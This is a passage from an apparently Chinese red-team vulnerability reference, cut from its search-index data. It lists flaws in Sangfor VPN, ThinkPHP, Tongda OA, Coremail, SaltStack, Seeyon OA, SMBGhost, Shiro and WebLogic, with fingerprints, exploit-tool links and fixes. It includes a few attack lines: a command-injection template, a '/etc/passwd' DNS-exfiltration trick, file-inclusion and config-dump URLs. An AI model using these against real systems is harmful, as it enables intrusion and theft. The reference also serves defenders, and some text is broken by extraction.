\"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' ' http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload &action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b \uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md \u6df1\u4fe1\u670dVPN\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6df1\u4fe1\u670d VPN \u67d0\u4e2a\u7279\u5b9a\u4ea7\u54c1\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c, 2019 \u653b\u9632\u6f14\u7ec3\u4f7f\u7528\u8fc7 \u5f71\u54cd\u7ec4\u4ef6 \u6df1\u4fe1\u670d VPN \u6f0f\u6d1e\u6307\u7eb9 Set-Cookie: TWFID=welcome to ssl vpn Sinfor Fofa Dork header=\"Set-Cookie: TWFID=\" \u6f0f\u6d1e\u5206\u6790 \u6df1\u4fe1\u670dvpnweb\u767b\u5f55\u9006\u5411\u5b66\u4e60 \u2013 potatso \u2013 \u535a\u5ba2\u56ed https://www.cnblogs.com/potatsoSec/p/12326356.html \u6f0f\u6d1e\u5229\u7528 \uff08\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff09 wget -t %d -T %d --spider %s \u5229\u7528\u6280\u5de7 \u8be5 \u7248 \u672c \u6df1 \u4fe1 \u670d VPN \u5c5e \u4e8e \u76f8 \u5bf9 \u65e9 \u671f \u7684 \u7248 \u672c , \u5927 \u6982 2008 \u5e74 \u5de6 \u53f3 , \u4f46\u76ee\u524d\u8fd8\u6709761\u4e2aip\u5f00\u653e\u5728\u516c\u7f51 \u8be5 \u7248 \u672c \u8f83 \u4f4e , whomai \u4e0d \u5b58 \u5728 , \u53ef \u4ee5 \u4f7f \u7528 uname, \u8fd9\u91cc\u6ca1\u6709\u7a7a\u683c\u53efdns\u4f20\u51fa\u6765 \u53bb\u9664\u7a7a\u683c\u4e5f\u7b80\u5355 cat /etc/passwd | tr \" \\n\" \"+|\" \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u66f4\u65b0\u8865\u4e01\u5347\u7ea7\u5230\u6700\u65b0\u7248 Thinkphp\u76f8\u5173 ThinkPHP3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Gets hell \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 https://xz.aliyun.com/t/99 ThinkPHP3.2.3_\u6700\u65b0\u7248update\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://www.anquanke.com/post/id/104847 ThinkPHP3.2.X_find_select_delete\u6ce8\u5165 \u5f71\u54cd\u7248\u672c <= 3.2.3 2.\u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629 ThinkPHP3.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/news/305625 ThinkPHP5_SQL\u6ce8\u5165\u6f0f\u6d1e&&\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u5f71\u54cd\u7248\u672c < 5.0.9 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/125 > < https://www.leavesongs.com/PENETRATION/thinkphp5-in \ufffesqlinjection.html ThinkPHP5.0.10- 3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Getshell \u5f71\u54cd\u7248\u672c < 5.0.11 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 ThinkPHP\u6846\u67b65.0.X_sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 \u5f71\u54cd\u7248\u672c < 5.0.16 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2257 ThinkPHP5.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 5.1.22 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/wangtanzhi/p/12741498.html ThinkPHP5.X_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u5f71\u54cd\u7248\u672c 5.0.5-5.0.22 5.1.0-5.1.30 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap er.seebug.org/770 \u901a\u8fbeOA\u76f8\u5173 \u00b6 \u901a\u8fbeOA\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA2017 \u901a\u8fbeOA V11.x<V11.5 3.\u6f0f\u6d1e\u6307\u7eb9 /static/templates/2017_01/userName.png Office Anywhere 20xx\u7248 \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf /ispirit/interface/gateway.php 4.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/NS-Sp4ce/TongDaOA-Fake-User https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e xp.py 5.\u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/lovequitepcs/p/12864203.html 6.\u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u53ef\u4ee5\u4f7f\u7528chrome\u7684EditThisCookie\u63d2\u4ef6\u4fee\u6539cookie\uff0c\u4fee\u6539cookies\u522b\u5fd8\u8bb0\u8bbf \u95ee\uff0c\u5426\u5219\u65e0\u6cd5\u767b\u5f55\u6210\u529f /general/index.php?isIB=0&modify_pwd=0 7.\u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u901a\u8fbeoa\u5230\u6700\u65b0\u7248\u672c \u901a\u8fbeOA\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA V11\u7248 \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA 2016\u7248 \u901a\u8fbeOA 2015\u7248 \u901a\u8fbeOA 2013\u589e\u5f3a\u7248 \u901a\u8fbeOA 2013\u7248 3.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/jas502n/OA-tongda-RCE 4.\u8be6\u7ec6\u6587\u7ae0 https://zhuanlan.zhihu.com/p/114264570 5.\u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u901a\u8fbeoa\u6700\u65b0\u8865\u4e01 \u5b89\u5168\u66f4\u65b0\u5730\u5740: http://www.tongda2000.com/news/673.php \u901a\u8fbeOA\u626b\u7801\u767b\u5f55\u4efb\u610f\u7528\u6237\u767b\u5f55 \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA v2017\u3001v11.x < v11.5 \u652f\u6301\u626b\u7801\u767b\u5f55\u7248\u672c 3.\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/7704#toc-4 Coremail\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Coremail\u90ae\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e Coremail\u4ea7\u54c1\u8bde\u751f\u4e8e1999\u5e74\uff0c\u7ecf\u8fc7\u4e8c\u5341\u591a\u5e74\u53d1\u5c55\uff0c\u5982\u4eca\u4ece\u4ebf\u4e07\u7ea7\u522b\u7684 \u8fd0\u8425\u7cfb\u7edf\uff0c\u5230\u51e0\u4e07\u4eba\u7684\u5927\u578b\u4f01\u4e1a\uff0c\u90fd\u6709\u4e86Coremail\u7684\u5ba2\u6237\u3002 \u622a\u6b622019\u5e74\uff0cCoremail\u90ae\u4ef6\u7cfb\u7edf\u4ea7\u54c1\u5728\u56fd\u5185\u5df2\u62e5\u670910\u4ebf\u7ec8\u7aef\u7528\u6237 \uff0c\u662f\u76ee\u524d\u56fd\u5185\u62e5\u6709\u90ae\u7bb1\u4f7f\u7528\u7528\u6237\u6700\u591a\u7684\u90ae\u4ef6\u7cfb\u7edf\u3002Coremail\u4eca\u5929\u4e0d\u4f46 \u4e3a\u7f51\u6613\uff08126\u3001163\u3001yeah\uff09\u3001\u79fb\u52a8\uff0c\u8054\u901a\u7b49\u77e5\u540d\u8fd0\u8425\u5546\u63d0\u4f9b\u7535\u5b50\u90ae\u4ef6 \u6574\u4f53\u6280\u672f\u89e3\u51b3\u65b9\u6848\u53ca\u4f01\u4e1a\u90ae\u5c40\u8fd0\u8425\u670d\u52a1\uff0c\u8fd8\u4e3a\u77f3\u6cb9\u3001\u94a2\u94c1\u3001\u7535\u529b\u3001\u653f\u5e9c \u3001\u91d1\u878d\u3001\u6559\u80b2\u3001\u5c16\u7aef\u5236\u9020\u4f01\u4e1a\u7b49\u7528\u6237\u63d0\u4f9b\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u4ef6\u548c\u53cd\u5783\u573e\u670d\u52a1\u3002 \u5229\u7528\u65b9\u5f0f http://host/mailsms/s?func=ADMIN:appState&dumpConfig=/ \u6d4f\u89c8\u5668\u8bf7\u6c42\u8bbf\u95ee\uff0c\u5373\u53ef\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u3002 \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0Coremail\u7248\u672c\u6216\u8054\u7cfb\u5382\u5bb6\u4fee\u590d SaltStack\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb SaltStack\u662f\u57fa\u4e8ePython\u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u4e00\u4e2a\u670d \u52a1\u5668\u57fa\u7840\u67b6\u6784\u96c6\u4e2d\u5316\u7ba1\u7406\u5e73\u53f0\uff0c\u5177\u5907\u914d\u7f6e\u7ba1\u7406\u3001\u8fdc\u7a0b\u6267\u884c\u3001\u76d1\u63a7\u7b49\u529f\u80fd \u3002 \u5f71\u54cd\u8303\u56f4\uff1a SaltStack < 2019.2.4 SaltStack < 3000.2 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 Saltstack\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1eEXP https://github.com/Imanfeng/SaltStack-Exp.git \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Cl0wn/p/12918432.html \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0\u7248\u672c SaltStack = 2019.2.4 SaltStack = 3000.2 https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8 1371b38b4a17e4f3b7 https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c 5e6912b065044720f3 \u81f4\u8fdcOA\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb CNVD \u300a \u5173 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u5b89\u5168\u516c\u544a\u300b\uff1a https://www.cnvd.org.c n/webinfo/show/5095 \u8be5 \u7cfb \u7edf \u7684 \u6f0f \u6d1e \u70b9 \u5728 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u7684Servlet\u63a5\u53e3\u66b4\u9732\uff0c\u5b89\u5168\u8fc7\u6ee4\u5904\u7406\u63aa\u65bd\u4e0d\u8db3\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u65e0\u9700 \u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3002 \u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u7f51\u7ad9\u540e \u95e8\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6f0f\u6d1e \u3002 \u5f71\u54cd\u8303\u56f4 \u81f4\u8fdcOA A8-V5 V6.1 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP2 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP3 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.1 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/timwhitez/seeyon-OA-A8-GetShell \u8be6\u7ec6\u6587\u7ae0 https://www.jianshu.com/p/0955bdd7329c \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8be6\u60c5 https://www.cnblogs.com/AtesetEnginner/p/12106741.html \u5386\u53f2\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f \u00b6 CVE-2020-0796 \u6c38\u6052\u4e4b\u9ed1\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u5fae\u8f6fSMBv3 Client/Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2020-0796 \u5f71\u54cd\u8303\u56f4\uff1a Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64- based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation) \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/chompie1337/SMBGhost_RCE_PoC \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Iamyoyodan/p/13081273.html \u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u5076\u5c14\u4f1a\u84dd\u5c4f \u9632\u62a4\u65b9\u6cd5 \u5173\u95ed\u9ad8\u5371\u7aef\u53e3139\u3001445\uff0c\u66f4\u65b0\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u7981\u7528SMBv3\u538b\u7f29\u547d\u4ee4: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters\" DisableCompression -Type DWORD -Value 1 - Force","title":"\u6f0f\u6d1e\u5e93"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#shiro","text":"","title":"shiro\u7c7b"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#apache-shiro","text":"Shiro-550, Shiro-721 \u6f0f\u6d1e\u7b80\u4ecb Apache Shiro\u662f\u4e00\u4e2a\u5f3a\u5927\u4e14\u6613\u7528\u7684Java\u5b89\u5168\u6846\u67b6,\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u548c \u4f1a\u8bdd\u7ba1\u7406\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro <= 1.2.4 \u5982 \u679c shiro \u7684 rememberMe \u529f \u80fd \u7684 AES \u5bc6 \u94a5 \u88ab \u6cc4 \u9732 , \u5c31\u4f1a\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u65e0\u8bbaShiro\u662f\u4ec0\u4e48\u7248\u672c\u3002 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe\u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro RememberMe 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8be6\u7ec6\u590d\u73b0 https://www.cnblogs.com/paperpen/p/11312671.html Shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u6c47\u603b\uff08Shiro-550+Shiro-721\uff09 https://www.cnblogs.com/xiaozi/p/13239046.html Shiro RememberMe 1.2.4\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01 Shiro RememberMe 1.2.4 \u53cd \u5e8f \u5217 \u5316 \u6f0f \u6d1e (Shiro-550, CVE-2016- 4437)\u590d\u73b0 https://blog.csdn.net/qq_43645782/article/details/106028873 Shiro 721 Padding Oracle\u653b\u51fb\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/193165 \u5229\u7528\u5de5\u5177 ShiroExploit https://github.com/feihong-cs/ShiroExploit Shiro_exploit https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex ploit.py \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7Shiro\u5230\u6700\u65b0\u7248\u5347\u7ea7\u5bf9\u5e94JDK\u7248\u672c\u5230 8u191/7u201/6u211/11.0.1 \u4ee5\u4e0aWAF\u62e6\u622aCookie\u4e2d\u957f\u5ea6\u8fc7\u5927\u7684rememberMe\u503c Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e (Shiro-682) \u6f0f\u6d1e\u7b80\u4ecb \u6f0f \u6d1e \u521d \u59cb \u6210 \u56e0 \u53ef \u4ee5 \u5b9a \u4f4d \u5230 PathMatchingFilterChainResolver\u7684getChain\u51fd\u6570\u4e0b\uff0c\u8be5\u51fd\u6570\u4f5c\u7528\u6839 \u636eURL\u8def\u5f84\u5339\u914d\u4e2d\u914d\u7f6e\u7684url\u8def\u5f84\u8868\u8fbe\u5f0f\u6765\u5339\u914d\u8f93\u5165\u7684URL\uff0c\u5224\u65ad\u662f\u5426 \u5339\u914d\u62e6\u622a\u5668\uff0c\u5339\u914d\u6210\u529f\u5c06\u4f1a\u8fd4\u56de\u54cd\u5e94\u7684\u62e6\u622a\u5668\u6267\u884c\u94fe\uff0c\u8ba9ShiroFither\u6267 \u884c\u6743\u9650\u64cd\u4f5c\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro < 1.5.2 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe \u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u5206\u6790\uff08CVE-2020-1957\uff09 https://www.freebuf.com/vuls/231909.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea71.5.2\u7248\u672c\u53ca\u4ee5\u4e0a\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u901a\u914d\u7b26\u4f5c\u4e3a\u52a8\u6001\u8def\u7531\u62e6\u622a\u5668\u7684URL \u8def\u5f84\u8868\u8fbe\u5f0f.","title":"Apache shiro \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#weblogic","text":"","title":"weblogic\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#weblogic-t3","text":"\u6f0f\u6d1e\u7b80\u4ecb Weblogic Server \u4e2d \u7684 RMI \u901a \u4fe1 \u4f7f \u7528 T3 \u534f \u8bae \u5728 Weblogic Server \u548c \u5176 \u5b83 Java \u7a0b \u5e8f \uff08 \u5ba2 \u6237 \u7aef \u6216 \u8005 \u5176 \u5b83 Weblogic Server \u5b9e \u4f8b \uff09 \u4e4b \u95f4 \u4f20 \u8f93 \u6570 \u636e , \u670d\u52a1\u5668\u5b9e\u4f8b\u4f1a\u8ddf\u8e2a\u8fde\u63a5\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2aJava \u865a\u62df\u673a\uff08JVM \uff09\u4e2d, \u5e76 \u521b \u5efa T3 \u534f \u8bae \u901a \u4fe1 \u8fde \u63a5 , \u5c06 \u6d41 \u91cf \u4f20 \u8f93 \u5230 Java \u865a \u62df \u673a . T3 \u534f \u8bae \u5728 \u5f00 \u653e WebLogic \u63a7 \u5236 \u53f0 \u7aef \u53e3 \u7684 \u5e94 \u7528 \u4e0a \u9ed8 \u8ba4 \u5f00 \u542f . \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u53d1\u9001\u6076\u610f\u7684\u7684\u53cd\u5e8f\u5217\u5316\u6570\u636e, \u8fdb\u884c\u53cd\u5e8f\u5217\u5316, \u5b9e\u73b0\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684weblogic\u7ec4\u4ef6\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u653b\u51fb. \u5f71\u54cd\u8303\u56f4 Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 \u53ef\u4ee5\u6839\u636eweblogic\u7684\u62a5\u9519\u9875\u9762\u4f5c\u4e3a\u7279\u5f81\uff1a The server has not found anything matching the Request-URI.No indication is given of whether the condition is temporary or permanent.\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6f0f\u6d1e\u590d\u73b0 Weblogic t3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2019-2890)\u5206\u6790 http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/ Weblogic T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2018-2628\uff09 https://blog.csdn.net/Aaron_Miller/article/details/106657746 \u76f8\u5173\u6f0f\u6d1e\u5305\u62ec\uff1a CVE-2017-3248 https://paper.seebug.org/333/ CVE-2018-2628 https://paper.seebug.org/985/ CVE-2018-2893 https://www.freebuf.com/vuls/178105.html CVE-2019-2890 https://paper.seebug.org/1069/ CVE-2020-2555(Oracle Coherence) https://paper.seebug.org/1141/ \u5229\u7528\u5de5\u5177 weblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u53ca \u65f6 \u66f4 \u65b0 \u8865 \u4e01 \u7981 \u7528 T3 \u534f \u8bae \u7981 \u6b62 T3 \u7aef \u53e3 \u5bf9 \u5916 \u5f00 \u653e , \u6216\u8005\u9650\u5236\u53ef\u8bbf\u95eeT3\u7aef\u53e3\u7684IP\u6765\u6e90 Weblogic XMLDecoder\u53cd\u5e8f\u5217\u5316 \u6f0f\u6d1e\u7b80\u4ecb WebLogic \u4e2d \u9ed8 \u8ba4 \u5305 \u542b \u7684 wls-wast \u4e0e wls9_async_response war \u5305 \uff0c \u7531 \u4e8e \u4ee5 \u4e0a WAR \u5305 \u91c7 \u7528 XMLDecoder \u53cd \u5e8f \u5217 \u5316 \u673a \u5236 \u6765 \u5904 \u7406 \u53d1 \u9001 \u8fc7 \u6765 \u7684 XML \u6570 \u636e \uff0c \u8fdc \u7a0b \u6076 \u610f \u653b \u51fb \u8005 \u53ef \u4ee5 \u901a \u8fc7 \u53d1 \u9001 \u7cbe \u5fc3 \u6784 \u9020 \u7684 HTTP \u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff0c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\u3002\u4e5f\u5c31 \u662f\u8bf4\uff0c\u653b\u51fb\u8005\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u8fdb\u884c\u6570\u636e\u7a83\u53d6\uff0c\u8fdb\u800c\u751a\u81f3 \u4f1a\u5a01\u80c1\u53d7\u5bb3\u8005\u7684\u5185\u7f51\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 /wls-wsat/CoordinatorPortType /async/AsyncResponseService /async/AsyncResponseServiceSoap12 \u6f0f\u6d1e\u590d\u73b0 WebLogic XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-10271\uff09 https://blog.csdn.net/u013622866/article/details/104872747 WebLogic-XMLDecoder\u53cd\u5e8f\u5217\u5316\u5206\u6790 https://hu3sky.github.io/2019/10/16/weblogic/ \u5229\u7528\u5de5\u5177 weblogicScanner https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u901a\u8fc7\u8bbf\u95ee\u7b56\u7565\u63a7\u5236\u7981\u6b62\u5916\u90e8/_async/* \u53ca /wls-wsat/*\u8def\u5f84\u7684URL\u8bbf\u95ee \u5220\u9664\u5bf9\u5e94war\u5305\u5e76\u91cd\u542f webLogic \u9650\u5236\u6e90IP\u5bf9\u5e94 weblogic 7001\u7aef\u53e3\u7684\u8bbf\u95ee","title":"Weblogic T3 